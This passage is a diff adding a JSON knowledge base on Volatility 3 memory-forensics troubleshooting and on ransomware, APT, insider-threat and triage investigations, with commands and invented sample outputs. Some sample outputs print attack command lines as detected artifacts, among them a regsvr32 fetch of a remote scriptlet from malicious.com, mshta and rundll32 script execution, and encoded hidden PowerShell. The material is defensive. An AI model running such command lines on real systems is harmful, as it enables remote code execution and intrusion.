@@ -1,0 +1,383 @@
+{
+  "knowledge_base_part": 5,
+  "categories": [
+    {
+      "id": "troubleshooting",
+      "name": "Troubleshooting",
+      "topics": [
+        {
+          "title": "Symbol Table Issues and Resolution",
+          "keywords": ["symbol errors", "ISF errors", "PDB errors", "symbol download failed", "unsupported OS", "profile not found"],
+          "difficulty": "intermediate",
+          "content": "Symbol table issues are the most common Volatility 3 problems. Symptoms include: 'Unsupported operating system', 'No suitable symbol table found', 'Unable to find a valid DOS header', and plugins returning no results or errors. Root causes: missing symbol files, corrupted downloads, network issues preventing symbol download, unsupported OS versions, and corrupted memory dumps. Resolution steps: 1) Run with -vv to see symbol loading details, 2) Check if symbols are cached in ~/.volatility3/symbols, 3) Manually download PDB from Microsoft Symbol Server, 4) Use dwarf2json for Linux/macOS symbols, 5) Verify memory dump with windows.info or equivalent. For air-gapped environments, pre-download symbols for target OS versions. Symbol mismatches cause subtle errors - plugins may run but return incorrect data. Always verify windows.info output matches expected OS before trusting other plugin output.",
+          "examples": [
+            {
+              "command": "vol -f memory.dmp -vv windows.info.Info",
+              "explanation": "Run with verbose output to diagnose symbol loading issues",
+              "use_case": "Troubleshooting when plugins fail or return no data",
+              "output_sample": "Volatility 3 Framework 2.5.0\nDEBUG    volatility3.framework.automagic.stacker: Attempting to stack using intel\nDEBUG    volatility3.framework.automagic.stacker: Stacking worked with intel\nDEBUG    volatility3.framework.symbols.windows.pdbconv: Looking for symbol file: ntkrnlmp.pdb\nDEBUG    volatility3.framework.symbols.windows.pdbconv: Checking cache: /home/user/.volatility3/symbols/windows/ntkrnlmp.pdb/GUID/ntkrnlmp.json.xz\nDEBUG    volatility3.framework.symbols.windows.pdbconv: Cache hit! Using cached symbol file\nINFO     volatility3.framework.symbols: Loaded symbols for Windows 10 19041\n\nVariable        Value\n\nKernel Base     0xf8000285c000\n...\n\n[SUCCESS: Symbols loaded correctly]"
+            },
+            {
+              "command": "vol -f memory.dmp --offline windows.info.Info",
+              "explanation": "Run in offline mode to prevent symbol download attempts",
+              "use_case": "Air-gapped environment or network issues",
+              "output_sample": "Volatility 3 Framework 2.5.0\nWARNING  volatility3.framework.symbols: Offline mode - not downloading symbols\nERROR    volatility3.framework.symbols: No cached symbols found for ntkrnlmp.pdb GUID12345\n\nTo fix: Download symbols manually from:\nhttps://msdl.microsoft.com/download/symbols/ntkrnlmp.pdb/GUID12345/ntkrnlmp.pdb\n\nThen run: vol -f memory.dmp --symbol-dirs /path/to/symbols windows.info"
+            },
+            {
+              "command": "vol -f memory.dmp --clear-cache windows.info.Info",
+              "explanation": "Clear symbol cache and re-download (fixes corrupted cache)",
+              "use_case": "Resolving corrupted symbol file issues",
+              "output_sample": "Volatility 3 Framework 2.5.0\nINFO     volatility3.framework.symbols: Clearing symbol cache\nDEBUG    volatility3.framework.symbols: Downloading fresh symbols\nDEBUG    volatility3.framework.symbols.windows.pdbconv: Downloading ntkrnlmp.pdb...\nProgress: 100%\nINFO     volatility3.framework.symbols: Symbol download complete\n\n[Plugins should now work]"
+            }
+          ],
+          "warnings": [
+            "Symbol mismatches can cause subtle incorrect results, not just errors",
+            "Always verify windows.info output matches expected OS before analysis",
+            "Large symbol files (50-200MB) require sufficient disk space",
+            "Firewall/proxy may block Microsoft Symbol Server access"
+          ],
+          "best_practices": [
+            "Run windows.info first to verify symbol loading",
+            "Use -vv for detailed debug output when troubleshooting",
+            "Pre-download symbols for target OS versions before incidents",
+            "Maintain offline symbol repository for air-gapped workstations",
+            "Use --clear-cache if symbols appear corrupted",
+            "Check ~/.volatility3/symbols for cached symbol files"
+          ],
+          "related_cves": [],
+          "related_topics": ["Volatility Basics", "Memory Formats"]
+        },
+        {
+          "title": "Memory Dump Format and Corruption Issues",
+          "keywords": ["corrupted dump", "invalid dump", "unsupported format", "memory format", "raw dump", "crash dump", "hiberfil"],
+          "difficulty": "intermediate",
+          "content": "Memory dump format issues prevent Volatility from parsing the memory correctly. Common problems: wrong file format, corrupted acquisition, incomplete dump, unsupported virtualization format, and hibernation file issues. Volatility 3 supports: raw memory (dd-style), Microsoft crash dump (.dmp), hibernation files (hiberfil.sys - requires decompression for Win8+), VMware snapshots (.vmem), VirtualBox memory dumps, LiME format (.lime), and EWF/E01 (with libewf). Diagnosis: use 'file' command to identify format, check file size matches expected RAM size, verify with hex editor for valid headers. Raw dumps should show valid kernel structures; crash dumps have specific headers. For VMware, ensure you have the .vmem file not just .vmss (snapshot state). Partial or truncated dumps may still be partially analyzable - Volatility will report gaps. Hibernation files from Windows 8+ are compressed and require extraction.",
+          "examples": [
+            {
+              "command": "file memory.dmp",
+              "explanation": "Use file command to identify memory dump format",
+              "use_case": "Determining what type of memory dump you have",
+              "output_sample": "memory.dmp: data\n\n[Raw memory dump - no specific format detected, likely dd-style raw dump]\n\n--- OR ---\n\nmemory.dmp: MS Windows 64bit crash dump, full dump, 17179869184 pages\n\n[Microsoft crash dump format - compatible with Volatility]"
+            },
+            {
+              "command": "vol -f memory.vmem windows.info.Info",
+              "explanation": "Analyze VMware snapshot memory file",
+              "use_case": "Processing memory from VMware virtual machine",
+              "output_sample": "Volatility 3 Framework 2.5.0\nProgress:  100.00               PDB scanning finished\n\nVariable        Value\n\nKernel Base     0xf8000285c000\nDTB     0x1aa000\n...\n\n[VMware .vmem format detected and parsed successfully]"
+            },
+            {
+              "command": "vol -f hiberfil.sys windows.info.Info",
+              "explanation": "Attempt to analyze Windows hibernation file",
+              "use_case": "Extracting memory from hibernation file",
+              "output_sample": "Volatility 3 Framework 2.5.0\nINFO     volatility3.framework.layers: Detected hibernation file\nINFO     volatility3.framework.layers: Decompressing hibernation data...\nProgress:  100.00               Decompression complete\n\nVariable        Value\n\nKernel Base     0xf8000285c000\n...\n\n[Hibernation file successfully decompressed and analyzed]\n\nNote: Data reflects system state at hibernation time, not current state"
+            },
+            {
+              "command": "xxd memory.dmp | head -20",
+              "explanation": "Check first bytes of dump for format identification",
+              "use_case": "Manual verification of dump format and integrity",
+              "output_sample": "00000000: eb52 904e 5446 5320 2020 2000 0208 0000  .R.NTFS    .....\n\n[This is a disk image, not memory dump - wrong file!]\n\n--- Expected for valid Windows memory dump ---\n00000000: 0000 0000 0000 0000 0000 0000 0000 0000  ................\n00001000: 4d5a 9000 0300 0000 0400 0000 ffff 0000  MZ..............\n\n[MZ header around 0x1000 indicates valid kernel in memory]"
+            }
+          ],
+          "warnings": [
+            "Disk images are NOT memory dumps - common confusion",
+            "Incomplete or truncated dumps may produce partial results",
+            "Hiberfil.sys from Windows 8+ requires decompression support",
+            "VMware .vmss files are state files, not memory - use .vmem"
+          ],
+          "best_practices": [
+            "Verify dump size matches expected RAM size",
+            "Use 'file' command to identify format before analysis",
+            "Check dump hash against acquisition documentation",
+            "For VMs, collect .vmem files specifically",
+            "Document dump format and source for chain of custody",
+            "Test acquisition tools on lab systems before incidents"
+          ],
+          "related_cves": [],
+          "related_topics": ["Memory Acquisition", "Symbol Tables"]
+        },
+        {
+          "title": "Performance Optimization",
+          "keywords": ["slow performance", "memory usage", "optimization", "caching", "parallel", "speed up volatility"],
+          "difficulty": "intermediate",
+          "content": "Memory analysis can be slow, especially for large dumps (16GB+). Optimization strategies: use --cache-path for repeated analysis (avoids reprocessing), filter plugins with --pid when possible, use faster storage (SSD vs HDD), increase available RAM for processing, run specific plugins rather than comprehensive scans, use renderers that don't require formatting (quick vs pretty), and parallelize independent plugins. Volatility 3 is more efficient than Volatility 2 but still resource-intensive. For very large dumps (64GB+), consider: splitting analysis across multiple sessions, focusing on specific processes of interest, using grep/string analysis before structured plugins, and running on workstations with 32GB+ RAM. psscan is particularly slow (full memory scan); use pslist first, psscan only when looking for hidden processes. Disable unused automagic features if you know the memory format.",
+          "examples": [
+            {
+              "command": "vol --cache-path /fast/ssd/cache -f memory.dmp windows.pslist.PsList",
+              "explanation": "Use cache on fast storage for repeated analysis",
+              "use_case": "Speeding up repeated analysis of same memory dump",
+              "output_sample": "Volatility 3 Framework 2.5.0\nINFO     volatility3.framework: Using cache at /fast/ssd/cache\nINFO     volatility3.framework: Cache hit - skipping memory layer construction\nProgress:  100.00               PDB scanning finished\n\n[Analysis completed in 5 seconds instead of 2 minutes]"
+            },
+            {
+              "command": "vol -f memory.dmp windows.pslist.PsList --pid 4256,6672",
+              "explanation": "Filter to specific PIDs to reduce processing time",
+              "use_case": "Focused analysis of known suspicious processes",
+              "output_sample": "Volatility 3 Framework 2.5.0\nProgress:  100.00               PDB scanning finished\n\nPID     PPID    ImageFileName   ...\n\n4256    4128    powershell.exe  ...\n6672    500     malware.exe     ...\n\n[Only 2 processes analyzed - much faster than full system]"
+            },
+            {
+              "command": "time vol -f memory.dmp windows.pslist.PsList && time vol -f memory.dmp windows.psscan.PsScan",
+              "explanation": "Compare execution time of pslist vs psscan to understand performance difference",
+              "use_case": "Understanding which plugins are slow for workflow optimization",
+              "output_sample": "[pslist output...]\nreal    0m15.234s\nuser    0m12.456s\nsys     0m2.123s\n\n[psscan output...]\nreal    2m34.567s\nuser    2m20.123s\nsys     0m8.456s\n\n[psscan takes 10x longer - use pslist for initial triage]"
+            }
+          ],
+          "warnings": [
+            "Caching uses disk space - ensure sufficient storage",
+            "Filtering may miss relevant data - use judiciously",
+            "Very large dumps may exhaust system RAM",
+            "Some plugins inherently require full memory scans"
+          ],
+          "best_practices": [
+            "Use SSD storage for both memory dump and cache",
+            "Start with fast plugins (pslist, netscan) before slow ones (psscan)",
+            "Filter by PID when you know the target processes",
+            "Run on workstation with RAM >= dump size if possible",
+            "Use --cache-path on fast storage for repeated analysis",
+            "Parallelize independent plugin execution across multiple terminals"
+          ],
+          "related_cves": [],
+          "related_topics": ["Volatility Basics", "Workflow Optimization"]
+        },
+        {
+          "title": "Common Plugin Errors and Fixes",
+          "keywords": ["plugin error", "exception", "unsupported", "failed", "no results", "debugging plugins"],
+          "difficulty": "intermediate",
+          "content": "Plugin errors range from informative warnings to complete failures. Common issues and solutions: 'Unsupported operating system' - symbol mismatch, run windows.info first; 'Required memory is not valid' - memory region paged out, normal for some entries; 'No suitable layer found' - wrong memory format or corrupted dump; 'AttributeError' - symbol version mismatch; 'Unable to find symbol' - symbols don't match OS version; empty results - may be normal (no network connections) or error (symbols wrong). Debug approach: 1) Run with -vv for verbose output, 2) Try windows.info first to verify basic functionality, 3) Check symbol loading succeeded, 4) Verify dump format with file/xxd, 5) Try on known-good test dump. Some plugins are OS-version specific; check plugin documentation. Report bugs with full verbose output, memory dump hash, and OS version.",
+          "examples": [
+            {
+              "command": "vol -f memory.dmp windows.malfind.Malfind",
+              "explanation": "Running malfind with common error scenarios",
+              "use_case": "Understanding and handling plugin errors",
+              "output_sample": "Volatility 3 Framework 2.5.0\nProgress:  100.00               PDB scanning finished\n\nPID     Process Start VPN       End VPN Tag     Protection      ...\n\n4       System  Required memory at 0xfa8018d41040 is not valid (process exited?)\n260     smss.exe        Required memory at 0xfa801a2c5080 is not valid (process exited?)\n2156    explorer.exe    0x3b0000        0x3b1fff        VadS    PAGE_EXECUTE_READWRITE  ...\n\n[NOTE: 'Required memory is not valid' is NORMAL for some processes\nwhere memory regions are paged out. Focus on processes that DO return data.]"
+            },
+            {
+              "command": "vol -f memory.dmp windows.netscan.NetScan",
+              "explanation": "Empty netscan results - understanding when this is normal vs error",
+              "use_case": "Interpreting empty plugin results",
+              "output_sample": "Volatility 3 Framework 2.5.0\nProgress:  100.00               PDB scanning finished\n\nOffset  Proto   LocalAddr       LocalPort       ForeignAddr     ForeignPort     State   PID     Owner   Created\n\n[NO OUTPUT]\n\nThis could mean:\n1. No network connections at time of capture (normal for offline systems)\n2. Network pool tags not found (possible symbol issue - check with -vv)\n3. Corrupted memory dump\n4. Unsupported Windows version\n\nDebug: Run with -vv to see if network structures are being scanned"
+            },
+            {
+              "command": "vol -f memory.dmp -vv windows.netscan.NetScan 2>&1 | grep -i error",
+              "explanation": "Extract error messages from verbose output",
+              "use_case": "Diagnosing why a plugin is failing",
+              "output_sample": "ERROR    volatility3.framework.plugins: Failed to load required symbol\nERROR    volatility3.framework.symbols: Cannot find symbol tcpip.pdb\n\n[ROOT CAUSE: tcpip.pdb symbols missing. Download from Microsoft Symbol Server\nor ensure network connectivity for automatic download.]"
+            }
+          ],
+          "warnings": [
+            "'Required memory is not valid' is often normal, not an error",
+            "Empty results may indicate no data OR an error - verify with -vv",
+            "Symbol errors can cause silent failures with wrong data",
+            "Some plugins require specific Windows versions or features"
+          ],
+          "best_practices": [
+            "Always use -vv when troubleshooting plugin issues",
+            "Verify basic functionality with windows.info first",
+            "Check grep for ERROR messages in verbose output",
+            "Test plugins on known-good memory dump to establish baseline",
+            "Consult Volatility documentation for version-specific plugins",
+            "Report bugs with full diagnostic information"
+          ],
+          "related_cves": [],
+          "related_topics": ["Symbol Tables", "Memory Formats"]
+        }
+      ]
+    },
+    {
+      "id": "real_world_scenarios",
+      "name": "Real-World Investigation Scenarios",
+      "topics": [
+        {
+          "title": "Ransomware Investigation Workflow",
+          "keywords": ["ransomware", "ransomware investigation", "encryption keys", "ransom note", "ransomware memory forensics"],
+          "difficulty": "advanced",
+          "content": "Ransomware memory forensics can recover encryption keys, identify the ransomware family, and understand encryption scope before keys are lost. Critical first step: capture memory IMMEDIATELY before reboot or shutdown - keys are in RAM. Workflow: 1) Acquire memory with minimal system interaction, 2) Run process analysis to find ransomware process, 3) Extract process memory for key recovery, 4) Search strings for encryption keys, wallet addresses, C2 URLs, 5) Identify ransomware family via YARA, mutex names, strings, 6) Timeline analysis to understand encryption scope, 7) Network analysis for C2 and data exfiltration. Key recovery: many ransomware families keep encryption keys in process memory during operation. Tools like ransomware-specific decryptors can use dumped process memory. Look for: large random-looking hex strings (potential keys), RSA public keys, ransom note templates, Bitcoin/Monero addresses, and file extension modifications. Document findings for law enforcement and recovery efforts.",
+          "examples": [
+            {
+              "command": "vol -f memory.dmp windows.pslist.PsList",
+              "explanation": "Find ransomware process - look for unusual names or high CPU/handle usage",
+              "use_case": "Identifying active ransomware encryption process",
+              "output_sample": "Volatility 3 Framework 2.5.0\nProgress:  100.00               PDB scanning finished\n\nPID     PPID    ImageFileName   Threads Handles CreateTime\n\n4       0       System  108     -       2024-01-15 08:23:11\n...\n2156    2144    explorer.exe    47      1876    2024-01-15 08:25:02\n7234    2156    DECRYPT_FILES.exe       8       456     2024-01-15 10:15:34\n7456    7234    cmd.exe 1       24      2024-01-15 10:15:36\n\n[RANSOMWARE IDENTIFIED: DECRYPT_FILES.exe (PID 7234)\n- Started at 10:15:34\n- Spawned cmd.exe (likely for deletion or persistence)\n- High handle count suggests file operations]"
+            },
+            {
+              "command": "vol -f memory.dmp windows.memmap.Memmap --pid 7234 --dump",
+              "explanation": "Dump ransomware process memory for key recovery",
+              "use_case": "Extracting encryption keys from ransomware memory",
+              "output_sample": "Volatility 3 Framework 2.5.0\nProgress:  100.00               Dumping memory\n\nStart   End     Dumped\n0x10000 0x20000 pid.7234.vad.0x10000-0x20000.dmp\n0x400000        0x500000        pid.7234.vad.0x400000-0x500000.dmp\n...\n\nTotal: 45 memory regions dumped to current directory\n\n[Next: Search dumps for encryption keys]\nstrings pid.7234.*.dmp | grep -E '[A-Fa-f0-9]{32,}' > potential_keys.txt"
+            },
+            {
+              "command": "vol -f memory.dmp yarascan.YaraScan --yara-rules \"rule ransomware_indicators { strings: $a = \\\"YOUR FILES HAVE BEEN ENCRYPTED\\\" $b = \\\"bitcoin\\\" $c = \\\".encrypted\\\" $d = \\\".locked\\\" $e = \\\"decrypt\\\" wide ascii condition: 2 of them }\" --pid 7234",
+              "explanation": "YARA scan for ransomware indicators in suspect process",
+              "use_case": "Confirming ransomware and identifying family",
+              "output_sample": "Volatility 3 Framework 2.5.0\nProgress:  100.00               PDB scanning finished\n\nOffset  PID     Rule    Component       Value\n\n0x42340 7234    ransomware_indicators   $a      YOUR FILES HAVE BEEN ENCRYPTED\n0x42500 7234    ransomware_indicators   $b      bitcoin\n0x42600 7234    ransomware_indicators   $c      .encrypted\n\n[CONFIRMED: Ransomware process contains ransom note template\nand file extension modification strings]"
+            },
+            {
+              "command": "strings memory.dmp | grep -iE 'bitcoin|btc|monero|xmr|wallet|1[A-Za-z0-9]{25,34}'",
+              "explanation": "Search for cryptocurrency wallet addresses in entire memory",
+              "use_case": "Finding ransom payment addresses for threat intelligence",
+              "output_sample": "bitcoin: 1A2b3C4d5E6f7G8h9I0jK1L2M3N4O5P6Q7R8S9T\nSend 0.5 BTC to wallet:\n1A2b3C4d5E6f7G8h9I0jK1L2M3N4O5P6Q7R8S9T\nmonero wallet address: 4...[long XMR address]\n\n[FOUND: Bitcoin wallet 1A2b3C4d5E6f7G8h9I0jK1L2M3N4O5P6Q7R8S9T\n- Report to law enforcement\n- Check blockchain for previous transactions]"
+            }
+          ],
+          "warnings": [
+            "Memory must be captured BEFORE reboot - keys are lost on shutdown",
+            "Minimize system interaction to avoid triggering anti-forensics",
+            "Some ransomware clears memory after encryption completes",
+            "Encryption key format varies by ransomware family"
+          ],
+          "best_practices": [
+            "IMMEDIATE memory acquisition is critical for key recovery",
+            "Dump ransomware process memory for offline key extraction",
+            "Identify ransomware family via YARA, strings, mutex names",
+            "Document wallet addresses for law enforcement",
+            "Check for decryptor availability for identified family",
+            "Preserve memory dump for potential future decryption tools"
+          ],
+          "related_cves": [],
+          "related_topics": ["Process Analysis", "String Analysis", "YARA Scanning"]
+        },
+        {
+          "title": "APT/Advanced Threat Investigation Workflow",
+          "keywords": ["APT", "advanced persistent threat", "nation state", "targeted attack", "sophisticated malware", "APT investigation"],
+          "difficulty": "advanced",
+          "content": "APT investigations require comprehensive analysis as attackers use sophisticated techniques to evade detection. Workflow: 1) Initial triage - process, network, malfind for quick wins, 2) Cross-reference pslist vs psscan for hidden processes, 3) Analyze all network connections for C2 infrastructure, 4) Check for code injection and fileless malware, 5) Registry persistence analysis, 6) Credential theft indicators (lsass access, mimikatz signatures), 7) Timeline analysis for attack progression, 8) YARA scanning with APT-specific rules. APT indicators: sophisticated C2 (domain fronting, DNS tunneling), memory-only implants, extensive lateral movement, credential theft, and data staging. Look for: abnormal process relationships, encoded PowerShell, living-off-the-land binaries (LOLBins), timestomping evidence, and connections to known APT infrastructure. Document everything for threat intelligence sharing and attribution efforts.",
+          "examples": [
+            {
+              "command": "vol -f memory.dmp windows.pslist.PsList && vol -f memory.dmp windows.psscan.PsScan",
+              "explanation": "Compare process lists to detect DKOM-hidden processes",
+              "use_case": "Finding APT processes hidden via kernel manipulation",
+              "output_sample": "[pslist shows 45 processes]\n[psscan shows 47 processes]\n\nDISCREPANCY: 2 hidden processes found!\n\nPID 8234 - implant.exe - NOT in pslist (HIDDEN)\nPID 8345 - beacon.exe - NOT in pslist (HIDDEN)\n\n[APT-level process hiding detected - kernel rootkit suspected]"
+            },
+            {
+              "command": "vol -f memory.dmp windows.cmdline.CmdLine | grep -iE 'powershell|cmd|wscript|cscript|mshta|rundll32|regsvr32'",
+              "explanation": "Find LOLBin abuse typical of APT activity",
+              "use_case": "Detecting living-off-the-land attack techniques",
+              "output_sample": "4256    powershell.exe  powershell.exe -nop -w hidden -enc SQBFAFgA...\n4567    mshta.exe       mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run ...\")\n4789    rundll32.exe    rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();\n5012    regsvr32.exe    regsvr32 /s /n /u /i:http://malicious.com/file.sct scrobj.dll\n\n[APT INDICATORS DETECTED:\n- Encoded PowerShell (common Cobalt Strike/APT technique)\n- MSHTA VBScript execution (Application Whitelisting bypass)\n- Rundll32 JavaScript execution (fileless attack)\n- Regsvr32 remote SCT execution (Squiblydoo attack)]"
+            },
+            {
+              "command": "vol -f memory.dmp windows.netscan.NetScan",
+              "explanation": "Analyze network connections for C2 infrastructure",
+              "use_case": "Mapping APT command and control communications",
+              "output_sample": "Volatility 3 Framework 2.5.0\nProgress:  100.00               PDB scanning finished\n\nOffset  Proto   LocalAddr       LocalPort       ForeignAddr     ForeignPort     State   PID     Owner\n\n0x...   TCPv4   192.168.1.100   49123   cdn.cloudfront.net      443     ESTABLISHED     8234    implant.exe\n0x...   TCPv4   192.168.1.100   49124   api.microsoft.com       443     ESTABLISHED     8234    implant.exe\n0x...   TCPv4   192.168.1.100   49125   192.168.1.50    445     ESTABLISHED     8345    beacon.exe\n0x...   TCPv4   192.168.1.100   49126   192.168.1.51    5985    ESTABLISHED     8345    beacon.exe\n\n[APT NETWORK INDICATORS:\n- Domain fronting via CloudFront and Microsoft APIs (C2 hiding)\n- Lateral movement to 192.168.1.50:445 (SMB)\n- Lateral movement to 192.168.1.51:5985 (WinRM)\n- Hidden processes with sophisticated network activity]"
+            },
+            {
+              "command": "vol -f memory.dmp windows.handles.Handles --pid 8234 | grep -i lsass",
+              "explanation": "Check for credential theft from APT implant",
+              "use_case": "Detecting APT credential access for lateral movement",
+              "output_sample": "8234    implant.exe     0xfa80...       0x28    Process 0x1fffff        lsass.exe\n8234    implant.exe     0xfa80...       0x2c    Section 0xf001f \\BaseNamedObjects\\SAMLsa\n\n[CRITICAL: APT implant has FULL ACCESS to lsass.exe\nThis indicates active or completed credential theft.\nAssume all credentials compromised - domain-wide password reset required.]"
+            }
+          ],
+          "warnings": [
+            "APT actors may have anti-forensics to detect memory acquisition",
+            "Sophisticated attacks leave minimal artifacts - thorough analysis required",
+            "Credential compromise typically requires domain-wide password reset",
+            "Share findings only through secure channels - APT may be monitoring"
+          ],
+          "best_practices": [
+            "Document EVERYTHING - APT cases often involve legal proceedings",
+            "Cross-reference all findings with threat intelligence",
+            "Check for lateral movement to all connected systems",
+            "Assume credential compromise and plan password reset",
+            "Coordinate with law enforcement for attribution",
+            "Share IOCs through ISACs and threat intelligence platforms"
+          ],
+          "related_cves": [],
+          "related_topics": ["Credential Extraction", "Rootkit Detection", "Timeline Analysis"]
+        },
+        {
+          "title": "Insider Threat and Data Exfiltration Investigation",
+          "keywords": ["insider threat", "data exfiltration", "data theft", "employee theft", "sensitive data", "corporate espionage"],
+          "difficulty": "intermediate",
+          "content": "Insider threat investigations focus on authorized users misusing access to steal data. Memory forensics reveals: files accessed and potentially copied, USB device connections, cloud upload activity, email attachments, and encryption of sensitive data for exfiltration. Workflow: 1) Process analysis for file access tools (7zip, WinRAR, cloud clients), 2) Handle analysis for accessed sensitive files, 3) Network analysis for cloud uploads and unusual destinations, 4) String analysis for file paths and credentials, 5) Registry for USB device history and recent files, 6) Timeline analysis correlating user logon with suspicious activity. Key artifacts: clipboard contents, document paths in process memory, cloud sync client activity, and staging directories. Unlike external attacks, insiders have legitimate access - focus on policy violations and unusual volume/patterns of access.",
+          "examples": [
+            {
+              "command": "vol -f memory.dmp windows.handles.Handles | grep -iE 'confidential|secret|internal|sensitive|salary|customer'",
+              "explanation": "Find handles to sensitive files indicating access",
+              "use_case": "Identifying what sensitive data was accessed",
+              "output_sample": "2156    explorer.exe    0xfa80...       0x28    File    0x12019f        \\Device\\HarddiskVolume2\\HR\\Salary_Data_2024.xlsx\n2156    explorer.exe    0xfa80...       0x2c    File    0x12019f        \\Device\\HarddiskVolume2\\Engineering\\Source_Code\\proprietary.zip\n3456    7z.exe  0xfa80...       0x18    File    0x12019f        \\Device\\HarddiskVolume2\\Users\\user\\Desktop\\exfil_package.7z\n3456    7z.exe  0xfa80...       0x1c    File    0x100001        \\Device\\HarddiskVolume2\\Customer\\Customer_Database.sql\n\n[INSIDER THREAT INDICATORS:\n- User accessed salary data (HR violation)\n- User accessed proprietary source code\n- 7zip creating exfil_package.7z (packaging for theft)\n- Customer database being compressed]"
+            },
+            {
+              "command": "vol -f memory.dmp windows.cmdline.CmdLine | grep -iE '7z|rar|zip|onedrive|dropbox|gdrive|mega|wetransfer'",
+              "explanation": "Find compression and cloud upload tools used for exfiltration",
+              "use_case": "Identifying data packaging and upload methods",
+              "output_sample": "3456    7z.exe  7z.exe a -p\"password123\" C:\\Users\\user\\Desktop\\exfil_package.7z C:\\HR\\* C:\\Engineering\\*\n4567    OneDrive.exe    \"C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe\" /background\n4789    Dropbox.exe     \"C:\\Program Files (x86)\\Dropbox\\Client\\Dropbox.exe\" /systemstartup\n5012    chrome.exe      ...mega.nz...upload...\n\n[EXFILTRATION METHODS IDENTIFIED:\n- 7z with password protection (hiding contents)\n- OneDrive and Dropbox running (potential sync to personal accounts)\n- MEGA upload activity in Chrome (cloud file hosting)]"
+            },
+            {
+              "command": "vol -f memory.dmp windows.netscan.NetScan | grep -iE 'dropbox|onedrive|gdrive|mega|box.com|wetransfer'",
+              "explanation": "Find network connections to cloud storage services",
+              "use_case": "Detecting data upload to cloud services",
+              "output_sample": "0x...   TCPv4   192.168.1.100   49234   162.125.66.1    443     ESTABLISHED     4567    OneDrive.exe\n0x...   TCPv4   192.168.1.100   49235   108.160.172.236 443     ESTABLISHED     4789    Dropbox.exe\n0x...   TCPv4   192.168.1.100   49236   31.216.148.10   443     ESTABLISHED     5012    chrome.exe\n\n[CLOUD UPLOAD CONNECTIONS:\n- OneDrive: Check if personal vs corporate account\n- Dropbox: Verify if authorized by organization\n- Chrome to MEGA IP: Unauthorized cloud storage upload]"
+            },
+            {
+              "command": "vol -f memory.dmp windows.filescan.FileScan | grep -iE 'usb|removable|e:\\|f:\\|g:\\'",
+              "explanation": "Find evidence of USB device or removable media access",
+              "use_case": "Detecting data copy to USB devices",
+              "output_sample": "0xfa80...       \\Device\\HarddiskVolume4\\KINGSTON\\backup_2024.zip\n0xfa80...       \\Device\\HarddiskVolume4\\KINGSTON\\exfil_package.7z\n0xfa80...       \\?\\E:\\Confidential_Docs\\\n\n[USB EXFILTRATION DETECTED:\n- KINGSTON USB drive connected\n- Backup archive copied to USB\n- Exfil package copied to USB\n- Direct access to E:\\ removable drive]"
+            }
+          ],
+          "warnings": [
+            "Insider investigations require HR and Legal coordination",
+            "Preserve chain of custody for potential termination or prosecution",
+            "Some data access may be legitimate - establish baseline patterns",
+            "Personal cloud accounts may be policy violation but not theft"
+          ],
+          "best_practices": [
+            "Coordinate with HR and Legal before deep investigation",
+            "Document data accessed with timestamps for timeline",
+            "Check for password-protected archives (hiding exfiltrated data)",
+            "Verify cloud accounts are personal vs corporate",
+            "Look for staging directories where data was collected",
+            "Correlate with badge/VPN logs for physical presence"
+          ],
+          "related_cves": [],
+          "related_topics": ["File Analysis", "Handle Analysis", "Timeline Analysis"]
+        },
+        {
+          "title": "Incident Response Triage Workflow",
+          "keywords": ["incident response", "triage", "initial response", "rapid analysis", "quick wins", "IR workflow"],
+          "difficulty": "beginner",
+          "content": "Effective incident response requires rapid initial triage to determine scope and severity. The standard memory triage workflow provides quick wins before deep analysis. Workflow order: 1) windows.info - verify dump validity and OS version, 2) windows.pslist - quick process overview, 3) windows.pstree - understand process relationships, 4) windows.netscan - identify network connections and potential C2, 5) windows.malfind - find code injection quickly, 6) windows.cmdline - see executed commands, 7) windows.svcscan - check for malicious services. This sequence takes 10-15 minutes and provides immediate answers about compromise indicators. Based on initial findings, prioritize deeper analysis: hidden processes require psscan, network IOCs require correlation with threat intelligence, code injection requires extraction and analysis, and credential theft indicators require hashdump/lsadump. Document initial findings for stakeholder briefing and guide subsequent response actions.",
+          "examples": [
+            {
+              "command": "vol -f memory.dmp windows.info.Info",
+              "explanation": "First command - verify dump is valid and identify OS",
+              "use_case": "Initial validation before analysis",
+              "output_sample": "Volatility 3 Framework 2.5.0\n\nKernel Base     0xf8000285c000\nNTBuildLab      19041.1.amd64fre.vb_release.191206-1406\nNTBuildNumber   19041\nSystemTime      2024-01-15 10:45:23.000000\nNtSystemRoot    C:\\Windows\n\n[VERIFIED: Windows 10 20H1 (Build 19041), captured 2024-01-15 10:45:23]"
+            },
+            {
+              "command": "vol -f memory.dmp windows.pstree.PsTree | head -50",
+              "explanation": "Quick process tree overview - look for unusual spawning",
+              "use_case": "Initial process analysis for obvious anomalies",
+              "output_sample": "4       0       System\n* 260   4       smss.exe\n** 348  340     csrss.exe\n** 392  340     wininit.exe\n*** 492 392     services.exe\n**** 588        492     svchost.exe\n**** 6672       492     malware_svc.exe    <- SUSPICIOUS\n*** 500 392     lsass.exe\n** 456  384     winlogon.exe\n*** 2156        2144    explorer.exe\n**** 4256       2156    powershell.exe\n***** 4300      4256    nc.exe             <- SUSPICIOUS\n\n[QUICK WINS:\n1. malware_svc.exe running as service - investigate\n2. powershell spawned netcat - likely reverse shell]"
+            },
+            {
+              "command": "vol -f memory.dmp windows.netscan.NetScan | grep ESTABLISHED | grep -v 127.0.0.1",
+              "explanation": "Quick network scan for external connections",
+              "use_case": "Rapidly identifying C2 and lateral movement",
+              "output_sample": "0x...   TCP     192.168.1.100:49234     185.234.67.89:4444      ESTABLISHED     4300    nc.exe\n0x...   TCP     192.168.1.100:49235     185.234.67.89:8080      ESTABLISHED     6672    malware_svc.exe\n0x...   TCP     192.168.1.100:49236     192.168.1.50:445        ESTABLISHED     7234    cmd.exe\n\n[IMMEDIATE ACTIONS REQUIRED:\n1. C2 to 185.234.67.89 on ports 4444, 8080 - BLOCK THIS IP\n2. Lateral movement to 192.168.1.50 via SMB - CHECK THAT HOST]"
+            },
+            {
+              "command": "vol -f memory.dmp windows.malfind.Malfind | head -30",
+              "explanation": "Quick code injection scan",
+              "use_case": "Finding injected malware in legitimate processes",
+              "output_sample": "2156    explorer.exe    0x3b0000        0x3b1fff        VadS    PAGE_EXECUTE_READWRITE\nfc 48 83 e4 f0 e8 c8 00 .H......\n\n[CRITICAL: Code injection in explorer.exe!\nSignature fc 48 83 e4 f0 = Cobalt Strike/Metasploit shellcode\nPrioritize for immediate investigation]"
